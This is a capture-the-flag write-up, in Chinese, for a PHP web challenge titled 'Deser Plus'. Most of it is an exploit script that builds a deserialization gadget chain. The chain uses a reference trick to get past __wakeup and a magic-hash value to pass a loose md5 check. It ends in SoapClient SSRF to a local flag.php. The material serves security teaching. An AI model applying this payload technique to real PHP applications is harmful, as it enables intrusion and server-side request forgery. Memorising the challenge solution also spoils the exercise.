# Deser Plus

**Author:** tel

**Difficulty:** Medium

**Category:** Web

## 题目描述

php 反序列化的常见绕过技巧，你学废了吗？

## 题目解析

**暴露端口：`80`**

1. flag.php 可以将 flag 写到 flag.txt，然后可以访问 `http://xxx/flag.txt` 拿到 flag，不过需要 SSRF。使用 php 原生类 `SoapClient` 的 `__call` 函数实现 SSRF

2. `class A` 中 `__wakeup` 会将 `a` 设定为 `hacker?`，需要 php 反序列化常见的 **引用绕过**，就借助 `B::__destruct $this->b = $this->k;` 来实现重新赋值

```php
<?php

    highlight_file(__FILE__);

    // something in flag.php

    class A
    {
        public $a;
        public $b;

        public function __wakeup()
        {
            $this->a = "hacker?";
        }

        public function __invoke()
        {
            if (isset($this->a) && $this->a == md5($this->a)) {
                $this->b->uwant();
            }
        }
    }

    class B
    {
        public $a;
        public $b;
        public $k;

        function __destruct()
        {
            $this->b = $this->k;
            die($this->a);
        }
    }

    class C
    {
        public $a;
        public $c;

        public function __toString()
        {
            $cc = $this->c;
            return $cc();
        }
        public function uwant()
        {
            if ($this->a == "phpinfo") {
                phpinfo();
            } else {
                $this->a->unexist_function();
            }
        }
    }

    $b = new B();
    $a = new A();
    $b->b = &$a->a;
    $b->k = "0e215962017";
    $c1 = new C();
    $c2 = new C();
    $c1->c = $a;
    $b->a = $c1;
    $c2->a = new SoapClient(null,array('location'=>'http://127.0.0.1/flag.php', 'uri'=>'http://127.0.0.1/flag.php'));
    // $c2->a = "phpinfo";
    $a->b = $c2;
    echo serialize($b);
```
